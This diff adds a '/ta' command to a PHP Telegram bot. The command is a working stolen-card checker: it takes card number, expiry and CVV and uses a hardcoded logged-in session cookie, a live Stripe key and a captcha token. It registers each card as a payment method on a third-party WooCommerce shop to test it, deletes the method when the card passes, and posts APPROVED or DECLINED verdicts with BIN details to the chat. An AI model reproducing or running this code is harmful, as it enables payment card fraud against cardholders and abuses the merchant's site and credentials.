@@ -2797,6 +2797,245 @@ ob_flush();
 
 }
 
+
+elseif((strpos($message, "!ta") === 0)||(strpos($message, "/ta") === 0)||(strpos($message, ".ta") === 0)){
+
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = trim($i[0]);
+$mes   = trim($i[1]);
+$ano  = trim(substr($i[2], -2));
+$cvv   = trim($i[3]);
+
+$bin = substr($lista, 0, 6);
+////
+
+
+$longitud = 4;
+$partes = [];
+
+for ($i = 0; $i < strlen($cc); $i += $longitud) {
+    $parte = substr($cc, $i, $longitud);
+    $partes[] = $parte;
+}
+
+
+$bin = substr($lista, 0, 6);
+$num = "$cc$mes$ano1$cvv";
+//-----------------------------------------------------//
+$verify = substr($cc, 16, 1);
+        if($verify != ""){
+                $respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+                sendMessage($chat_id,$respuesta, $message_id);
+                die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+
+}else{
+        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ta cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ta cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ta cc|m|y|cvv\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
+}
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+
+$cc = implode('+', $partes);
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://tayhope.com/my-account/add-payment-method/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2F; woocommerce_items_in_cart=1',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'accept-language: es-US,es;q=0.9',
+    'sec-ch-ua-platform: "Android"',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+// Extraer nonce
+$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
+preg_match($patron_nonce, $response, $matches_nonce);
+$nonce = $matches_nonce[1];
+curl_close($curl);
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftayhope.com&time_on_page=32394&client_attribution_metadata%5Bclient_session_id%5D=8c405d81-87ee-4878-903c-8197346734a2&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=79b6db38-13c2-4b80-9428-9d00a6cea8d23a2bca&muid=f87acd8c-3c42-492d-a089-d786e071117723820f&sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954&key=pk_live_51PRDRyRu0O8mp73n3o0HQHdi68URnbYQVlBpDv1iGSlngWgApN1jmzay2cuYC5gZlO0MFZKg3UyaLKPS54vnWSjF001pzrXQWc&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZXJMdVJoeHJHcFVnTVF5NEVsVzdwWG1CVFpQOGJVazNrY2g0OUNVcFNydUxjZ29sZTFLNEZyVER1b1ZKRXpPRThpQkxkb3plT3ZIWWNRbTR6SE81NllqVnJVd1hieHkyckUzWmtGQmpKcHIyMXg1T2xjM3R0NDRtd29TOFBVY2h1NTkvQ1JXeC94ZmFyVHFtUDc0QTZic1RXdDhUWVpma3JFa2xQN2xBVEp1ZDM4eGhmOGFYcUZEU3VYOS9NdGc0T2VVdW5xSE1RNWRRM0w0ZlJFMWlEd3prQ3ZnQnRoTFM5WjhrMGhHelM1R3lzQ0Y5UllBRXVYK0k5dk91eGE4ZGMvSEExZ0Njd0Z2Q015czltaUVYeGdRaTY0Z0xTcE5WNjAxVUZpS05kUmJMU1V6RFl1dkowSzhxUDdsZ3FGdHZIdU9uUGZ5S0Vkd1FKQXlyYlBBL3VjQyswZWd6S1FKOXBiYlorNlhhUk9ibllaSzRLSnBHVGFRd3JTTW90cDZrLytlQXpvbWkyVEwyT0JKNHliWnQxdVFpU3c0akNlMk5wcU5jTVN1RWlES1dzd2hkYnVkTXZNc2ZIRVQ5T1dlMG5DdndnN1AwMXFVSmt1WWE5ZXhmd3hZSXdKZUpteVhBbnJ5bUM2RkhEaWp5Tml0OE41N3FoclpBQ1NNQXZ3QzcwOFk5d1hobHBKV1BTUXZvRUNpZ3llWUNCQ2dNOE0zTElJSit0SzNwUiszWWRaVlV4Z1NSVWxRajJnVlYwYlJGSVN0RlRjZHFzU0xhWXd3N1hzVzJYRk9DKzJSMHJCMnZidUloZXBBRm9JWVZLWHdnb0FDK0U4ZUZLV1Jld2ZoMExNcG45OWhETDZDcVIyREdwZWVvTzYwQzJiZ2dKbFJhbnRxUEg2WFhGZUR3YWRaTWRaS3ZIcmo4MUgrQ2llanMyWWxqYThXNXYxY3c0QTdWRXRSRlBrZ29KSzVQenEyOWo0Q2RaMEtheWVTV0FpV3VEMUd6WG1haEU0NjI2WVN2ZjcrYWdKSDZldDRVV2ZOYUI5SkQwcVRSVlhMSzYyT212QitLYlpyOERoVFA1R0c3TUt1TmxTN0tIdG9OUXVTekxzdldrRUJWQnEydTlqMTZyeEpIN2JWSXlwM1hFczNxbHRQd09mUjg3YVBDNERJNWx6QzdldDNQVEQ4a0VkSDdoejlxQmxDYlY3L09CVXpaa3ZKOEJ4OVJPWDlDWUNsQklFczZHbndFM3JSVjgvRzUvZXZUbHo4c1pQcTBTR1EvZ3dlbkZqL2xySU9TZmNoSUJZMzRvWUhVM0Jnc3BMVy95K1JXVzZLbnBrYmdXaVRrNmdnRVZrZ1NmWDcreTNKZE9nYm1sbWRtTkhGRW9ock41b284cFhzd2QyQWdaWFB6UDVzSmNLWS81bnJ3dklNVklRYjlVR2E0eUszMVl4WXgyUndQTVRvVjlUd3hQbDdzY0wrTVJTeXhMd0NINHlLU1hGZVVkQzB3OTJ2RFZzK2tJaUVRYTVqZjd3bnppWUVDcTU0U0I4ekVGS01DN0U4LzhqOFF2Vi8yTjN5R0FDNHV4dWVoMjNZajRZN28xd1Y3WmxEcDh0dDV3Nk9xLzdBQjVkcTREZmdUY2xZMmJuRGJHb0h3V2tMeGJWTG9hSFdxWm9aUFlJWmFEL0FUWHJ2MGVtSkdsa0h1OHk5YzRuWFI5cVlPWXJlZXEvd2NIbFlhRTJnaXIxT3V1OEF6TWVwZjNoZ1NObXZrVjZic1BhNHlNUHpIREdPMEI3VjVzbm41UU5RdFoyeDM5ZnY2VitIOXFpY2VDVnI1SEE0aEFpa05abjBlQWNUcFNmdDJmZWNSL2ZEZGtQWG0vYTZRVHJmRDVZOTExdEV2Z045cmhIYjZrQ0dBY0QyaFRUbVhONlBnMlJvYkFsSmZ0SWY1ZTlWeXhkc2NKd2l5cG5RT0t2RW9hcDRrcXg2L1lIKy9HVDlIL01PWXY3S3JrM3lWTnhLSGw3V2ZXOTJVVVpvTGxZaUVBczJHd2h4bVdxQzRXbEY2bjNHRFgxa0IyQXdCMlQzOWtiTG5TNnpPQjBFWnR1Zm01eVdwY0dJcjdXUXdKRk5TcU9qS24xbTZRM3c0OWdkaVRsK1BIN0RPMmFiRVdhejZGOGdjck1kT3RvajJGZStMbE1uZkJJcDY3dHlJZ2hHdHRrVjNjVHFMWm50Wk9yZkVYYkRwMW8yVHFsZkJXRkRXLzZiMGZ4MEM1YWJMNUVOa0hISk5wY1RaZHgyd3RFeTVRaHR6NURORDZtYTNSYmVudDIyL1hxLzBYWUZJTmhIZ2JzclVpUnRDR3hoM1QxVTcrd0g2K3l0V1o5N2J6YlpOMzlDVmZOU25Xem1XcVAvR2tYeWdtYWQvRzlvNzdXd2w3QkNUeFR3ZzJjM1JobmJUMkl3OGFGRlBaUng5dEkvdldGN2xac3FlNkpBMVRyQm9iM054TDhtaVVoYkhOazVxZkZHN1JYSWxzM2tWMkZTQlBCMTZjaFNKNVZhdVBFREFydER2RUI2d08xY1oxTzlUYVE1bG1nTmFZZzBXZ3FDZ3lsTzN5MTA4bVFleEFLYVU0QS9jMWpnYTZBUkhqb0ZQWXVBcFIySEhRYW92ZEZzMWpUVUZrc21ZTTYwYUlqeUZrb3IwbW82NElqM0tveHR0SEczYmgzWW80SWQrTkhtR3hZOUd3Z0dEMjdwald5dk5wZndaRkNaMzJDUTkzQkhvTlo5SEZCK0ZRMUpaWVpBb29BZ0xBaXd0ZEZiZUgvUXJKcGNYbURxV1h3PT0iLCJleHAiOjE3MzE3OTkzMDQsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWZmMDllMmQiLCJwZCI6MCwiY2RhdGEiOiJIbWxnbHpWaTRiUjUxaUhhSjM1Z0ZtRUNuN1ZXSTVIRXYrUVovY1NCMXZKNVZmVWNQSHFzYUJuNmZGYUVRTXdqU3h0OFJjVUttWjF1aUl0TTZyNTV4RVdaWjdycGFBMEZIck9QL1FuenF1bXplQjUzNTYvTytnN2ZvWmZrN1FKbGwzOTdvbmt6SGVQQnJzdlJFN1BBbWcxamp2YWpDdnpZbDVmUDUyWHQ5RnN4Sk1HY3N4RzgrMUVWaUVYaExpVEVHOVVmYmZyU3dhcUkyWlArIn0.Fja1qIx2qx8Y4OqICzg1kr4YgH6kX0UYl1XYACNkOIE',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Accept: application/json',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'origin: https://js.stripe.com',
+    'referer: https://js.stripe.com/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$id = $json["id"];
+curl_close($curl);
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://tayhope.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
+  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'x-requested-with: XMLHttpRequest',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'origin: https://tayhope.com',
+    'referer: https://tayhope.com/my-account/add-payment-method/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+//------------------------------------------//
+//$message = $json['data']['error']['message'];
+$message = str_replace("Error: ", "", $json['data']['error']['message']);
+$success = $json['success'];
+$status = $json['data']['status'];
+curl_close($curl);
+
+if ($success === true && $status === "succeeded") {
+    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://tayhope.com/my-account/payment-methods/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://tayhope.com/my-account/add-payment-method/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
+preg_match($patron, $response, $coincidencias);
+$url_nonce = $coincidencias[0];
+curl_close($curl);
+
+echo "$url_nonce\n";
+
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://tayhope.com/my-account/delete-payment-method'.$url_nonce.'',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; woocommerce_items_in_cart=1; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'referer: https://tayhope.com/my-account/payment-methods/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+} elseif ($success === true && $status === "requires_action") {
+    $respo = "3DS Authenticate Rejected ❌";
+} else {
+    $respo = $message;
+}
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+if (empty($respo)) {
+        $respo = $response;
+}
+
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = False;
+} else {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $live = False;
+}
+
+if ($live) {
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+}
+	
 	
 elseif((strpos($message, "!tr") === 0)||(strpos($message, "/tr") === 0)||(strpos($message, ".tr") === 0)){
 
